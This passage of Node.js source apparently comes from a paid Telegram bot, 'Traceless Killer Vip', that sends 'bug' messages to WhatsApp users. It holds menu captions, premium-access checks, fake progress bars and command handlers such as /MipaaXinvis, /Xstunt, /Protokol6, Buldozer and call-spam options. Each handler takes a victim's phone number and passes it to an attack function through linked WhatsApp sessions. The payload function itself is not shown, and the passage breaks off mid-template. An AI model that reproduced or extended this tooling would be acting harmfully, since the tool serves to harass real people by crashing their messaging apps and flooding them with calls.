𖥻 Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
𖥻 Lɪʙʀᴀʀʏ : Node Telegram
𖥻 Tʏᴘᴇ : Case-Plugins
𖥻 Vᴇʀsɪᴏɴ : 0.5
𖥻 Sᴛᴀᴛᴜs : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
𖥻 Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
𖥻 Sᴇɴᴅᴇʀ : ${sessions.size}

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
[  ✧ Dᴇʟᴀʏ Iɴᴠɪs Sᴛᴜɴᴛ 〽️  ]
┏────────────────────────┓
│ ╭────────────≫
│ │⚰︎ ⧽ /MipaaXinvis
│ │⚰ ︎⧽ /Xstunt
│ │⚰ ︎⧽ /Protokol6
│ │⚰︎ ⧽ /Protokol7
│ │⚰︎ ⧽ /Protokol8
│ │⚰ ︎⧽ /AllProtokol
│ ╰────────────≫
┗────────────────────────┛
┏──────────────┓
│ Dᴇᴠ : @QueenMvaa
┗──────────────┛`;
      replyMarkup = {
        inline_keyboard: [
      [
            { text: "Dᴇʟᴀʏ Iɴᴠɪs", callback_data: "Delayinvis" },
            { text: "Dᴇʟᴀʏ Iɴᴠɪs Hᴏᴜʀs", callback_data: "Delayinvishard" },
          ],
      [
            { text: "Bᴜʟᴅᴏᴢᴇʀ", callback_data: "Buldozer" },
            { text: "Bᴜʟᴅᴏᴢᴇʀ Hᴏᴜʀs", callback_data: "Buldozerhard" },
          ],
      [
            { text: "Mᴏᴅᴇ Sᴘᴀᴍ Nᴏ Bᴜɢ", callback_data: "Spamnobug" }
          ],
      [
            { text: " 〽️ ", callback_data: "back" }
          ],
      ],
      };
    }
    
    if (query.data === "Delayinvishard") {
      caption = `\`\`\` 
『 𝗧͉͢𝗿͠𝗮𝗰͍͠𝗲͓𝗹͛𝗲͜͡𝘀𝘀 𝗞͓͢𝗶𝗹͠𝗹𝗲͍𝗿͛ ⚔️ 』

𖥻 Sᴄʀɪᴘᴛ : Traceless Killer Vip
𖥻 Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
𖥻 Lɪʙʀᴀʀʏ : Node Telegram
𖥻 Tʏᴘᴇ : Case-Plugins
𖥻 Vᴇʀsɪᴏɴ : 0.5
𖥻 Sᴛᴀᴛᴜs : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
𖥻 Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
𖥻 Sᴇɴᴅᴇʀ : ${sessions.size}

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
[  ✧ Dᴇʟᴀʏ Iɴᴠɪs Hᴏᴜʀs 〽️  ]
┏────────────────────────┓
│ ╭────────────≫
│ │⚰︎ ⧽ /MipaaXinvisX
│ │⚰ ︎⧽ /Xhard
│ │⚰ ︎⧽ /Protokol6X
│ │⚰︎ ⧽ /Protokol7X
│ │⚰︎ ⧽ /Protokol8X
│ │⚰ ︎⧽ /AllProtokolX
│ ╰────────────≫
┗────────────────────────┛
┏──────────────┓
│ Dᴇᴠ : @QueenMvaa
┗──────────────┛`;
      replyMarkup = {
        inline_keyboard: [
      [
            { text: "Dᴇʟᴀʏ Iɴᴠɪs", callback_data: "Delayinvis" },
            { text: "Dᴇʟᴀʏ Iɴᴠɪs Hᴏᴜʀs", callback_data: "Delayinvishard" },
          ],
      [
            { text: "Bᴜʟᴅᴏᴢᴇʀ", callback_data: "Buldozer" },
            { text: "Bᴜʟᴅᴏᴢᴇʀ Hᴏᴜʀs", callback_data: "Buldozerhard" },
          ],
      [
            { text: "Mᴏᴅᴇ Sᴘᴀᴍ Nᴏ Bᴜɢ", callback_data: "Spamnobug" }
          ],
      [
            { text: " 〽️ ", callback_data: "back" }
          ],
      ],
      };
    }
    
    if (query.data === "Buldozer") {
      caption = `\`\`\` 
『 𝗧͉͢𝗿͠𝗮𝗰͍͠𝗲͓𝗹͛𝗲͜͡𝘀𝘀 𝗞͓͢𝗶𝗹͠𝗹𝗲͍𝗿͛ ⚔️ 』

𖥻 Sᴄʀɪᴘᴛ : Traceless Killer Vip
𖥻 Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
𖥻 Lɪʙʀᴀʀʏ : Node Telegram
𖥻 Tʏᴘᴇ : Case-Plugins
𖥻 Vᴇʀsɪᴏɴ : 0.5
𖥻 Sᴛᴀᴛᴜs : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
𖥻 Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
𖥻 Sᴇɴᴅᴇʀ : ${sessions.size}

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
[  ✧ Bᴜʟᴅᴏᴢᴇʀ 𝚡 Dᴇʟᴀʏ Iɴᴠɪs 〽️  ]
┏────────────────────────┓
│ ╭────────────≫
│ │⚰︎ ⧽ /Buldozer
│ │⚰ ︎⧽ /BuldozerV2
│ │⚰ ︎⧽ /BuldozerV3
│ │⚰︎ ⧽ /Buldozer1Gb
│ │⚰︎ ⧽ /Buldozer50Gb
│ ╰────────────≫
┗────────────────────────┛
┏──────────────┓
│ Dᴇᴠ : @QueenMvaa
┗──────────────┛`;
      replyMarkup = {
        inline_keyboard: [
      [
            { text: "Dᴇʟᴀʏ Iɴᴠɪs", callback_data: "Delayinvis" },
            { text: "Dᴇʟᴀʏ Iɴᴠɪs Hᴏᴜʀs", callback_data: "Delayinvishard" },
          ],
      [
            { text: "Bᴜʟᴅᴏᴢᴇʀ", callback_data: "Buldozer" },
            { text: "Bᴜʟᴅᴏᴢᴇʀ Hᴏᴜʀs", callback_data: "Buldozerhard" },
          ],
      [
            { text: "Mᴏᴅᴇ Sᴘᴀᴍ Nᴏ Bᴜɢ", callback_data: "Spamnobug" }
          ],
      [
            { text: " 〽️ ", callback_data: "back" }
          ],
      ],
      };
    }
    
    if (query.data === "Buldozerhard") {
      caption = `\`\`\` 
『 𝗧͉͢𝗿͠𝗮𝗰͍͠𝗲͓𝗹͛𝗲͜͡𝘀𝘀 𝗞͓͢𝗶𝗹͠𝗹𝗲͍𝗿͛ ⚔️ 』

𖥻 Sᴄʀɪᴘᴛ : Traceless Killer Vip
𖥻 Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
𖥻 Lɪʙʀᴀʀʏ : Node Telegram
𖥻 Tʏᴘᴇ : Case-Plugins
𖥻 Vᴇʀsɪᴏɴ : 0.5
𖥻 Sᴛᴀᴛᴜs : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
𖥻 Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
𖥻 Sᴇɴᴅᴇʀ : ${sessions.size}

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
[  ✧ Bᴜʟᴅᴏᴢᴇʀ 𝚡 Dᴇʟᴀʏ Iɴᴠɪs Hᴏᴜʀs 〽️  ]
┏────────────────────────┓
│ ╭────────────≫
│ │⚰︎ ⧽ /BuldozerX
│ │⚰ ︎⧽ /BuldozerV2X
│ │⚰ ︎⧽ /BuldozerV3X
│ │⚰︎ ⧽ /Buldozer1GbX
│ │⚰︎ ⧽ /Buldozer50GbX
│ ╰────────────≫
┗────────────────────────┛
┏──────────────┓
│ Dᴇᴠ : @QueenMvaa
┗──────────────┛`;
      replyMarkup = {
        inline_keyboard: [
      [
            { text: "Dᴇʟᴀʏ Iɴᴠɪs", callback_data: "Delayinvis" },
            { text: "Dᴇʟᴀʏ Iɴᴠɪs Hᴏᴜʀs", callback_data: "Delayinvishard" },
          ],
      [
            { text: "Bᴜʟᴅᴏᴢᴇʀ", callback_data: "Buldozer" },
            { text: "Bᴜʟᴅᴏᴢᴇʀ Hᴏᴜʀs", callback_data: "Buldozerhard" },
          ],
      [
            { text: "Mᴏᴅᴇ Sᴘᴀᴍ Nᴏ Bᴜɢ", callback_data: "Spamnobug" }
          ],
      [
            { text: " 〽️ ", callback_data: "back" }
          ],
      ],
      };
    }
      
    if (query.data === "Spamnobug") {
      caption = `\`\`\` 
『 𝗧͉͢𝗿͠𝗮𝗰͍͠𝗲͓𝗹͛𝗲͜͡𝘀𝘀 𝗞͓͢𝗶𝗹͠𝗹𝗲͍𝗿͛ ⚔️ 』

𖥻 Sᴄʀɪᴘᴛ : Traceless Killer Vip
𖥻 Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
𖥻 Lɪʙʀᴀʀʏ : Node Telegram
𖥻 Tʏᴘᴇ : Case-Plugins
𖥻 Vᴇʀsɪᴏɴ : 0.5
𖥻 Sᴛᴀᴛᴜs : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
𖥻 Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
𖥻 Sᴇɴᴅᴇʀ : ${sessions.size}

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
[  ✧ Mᴏᴅᴇ Sᴘᴀᴍ Nᴏ Bᴜɢ 〽️  ]
┏────────────────────────┓
│ ╭────────────≫
│ │⚰︎ ⧽ /Spamcall
│ │⚰ ︎⧽ /SpamVideocall
│ ╰────────────≫
┗────────────────────────┛
┏──────────────┓
│ Dᴇᴠ : @QueenMvaa
┗──────────────┛`;
      replyMarkup = {
        inline_keyboard: [
      [
            { text: "Dᴇʟᴀʏ Iɴᴠɪs", callback_data: "Delayinvis" },
            { text: "Dᴇʟᴀʏ Iɴᴠɪs Hᴏᴜʀs", callback_data: "Delayinvishard" },
          ],
      [
            { text: "Bᴜʟᴅᴏᴢᴇʀ", callback_data: "Buldozer" },
            { text: "Bᴜʟᴅᴏᴢᴇʀ Hᴏᴜʀs", callback_data: "Buldozerhard" },
          ],
      [
            { text: "Mᴏᴅᴇ Sᴘᴀᴍ Nᴏ Bᴜɢ", callback_data: "Spamnobug" }
          ],
      [
            { text: " 〽️ ", callback_data: "back" }
          ],
      ],
      };
    }

    if (query.data === "owner_menu") {
      caption = `\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Sᴄʀɪᴘᴛ : Mɪᴘᴀ Mᴏᴅᴅᴇʀs
│ Vᴇʀsɪᴏɴ : 0.1
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ
│ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
┏──────────────┓
│    Oᴡɴᴇʀ Mᴇɴᴜ
┗──────────────┛
┏────────────────────────┓
│ ╭────────≫
│ 𖥻 /Addsender - 62xxx
│ 𖥻 /Addadmin - id
│ 𖥻 /Deladmin - id
│ 𖥻 /Addprem - id
│ 𖥻 /Delprem - id
│ ╰────────≫
┗────────────────────────┛
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "⚔️", callback_data: "back" }]],
      };
    }
    
    if (query.data === "admin_menu") {
      caption = `\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Sᴄʀɪᴘᴛ : Mɪᴘᴀ Mᴏᴅᴅᴇʀs
│ Vᴇʀsɪᴏɴ : 0.1
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ
│ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
┏──────────────┓
│    Aᴅᴍɪɴ Mᴇɴᴜ
┗──────────────┛
┏────────────────────────┓
│ ╭────────≫
│ 𖥻 /Addprem - id
│ 𖥻 /Dellprem - id
│ ╰────────≫
┗────────────────────────┛
┏──────────────┓
│ Dᴇᴠ : @QueenMvaa
┗──────────────┛

`;
      replyMarkup = {
        inline_keyboard: [[{ text: "⚔️", callback_data: "back" }]],
      };
    }
   
    
    if (query.data === "crsc") {
      caption = `\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Sᴄʀɪᴘᴛ : Mɪᴘᴀ Mᴏᴅᴅᴇʀs
│ Vᴇʀsɪᴏɴ : 0.1
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @QueenMvaa
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ
│ Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛

"Orang sukses bukanlah orang yang tidak pernah jatuh, tetapi orang yang tidak pernah menyerah saat jatuh." - DʀʏᴢxMᴏᴅs
\`\`\`
┏──────────────┓
│    Cʀᴇᴅɪᴛ Sᴄʀɪᴘᴛ
┗──────────────┛
┏───────────────────────────┓
│ Dᴇᴠᴇʟᴏᴘᴇʀ Sᴄʀɪᴘᴛ : Dryzx || Modders 〽️
│ ───────────────────────────
│ Sᴜᴘᴘᴏʀᴛ : Mipaa || Modders 〽️
│ Sᴜᴘᴘᴏʀᴛ : Linsz || Modders 〽️
│ Sᴜᴘᴘᴏʀᴛ : Juanx || Modders 〽️
│ Sᴜᴘᴘᴏʀᴛ : Reyyy || Modders 〽️
│ Sᴜᴘᴘᴏʀᴛ : Damz || Modders 〽️
│ Sᴜᴘᴘᴏʀᴛ : Malzz || Modders 〽️
│ Sᴜᴘᴘᴏʀᴛ : Vynzz || Modders 〽️
│ Sᴜᴘᴘᴏʀᴛ : Robzz || Modders 〽️
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗───────────────────────────┛
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "⚔️", callback_data: "back" }]],
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "Markdown",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/MipaaXinvis\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontol(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Xstunt\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Allprotontol(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Protokol6\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
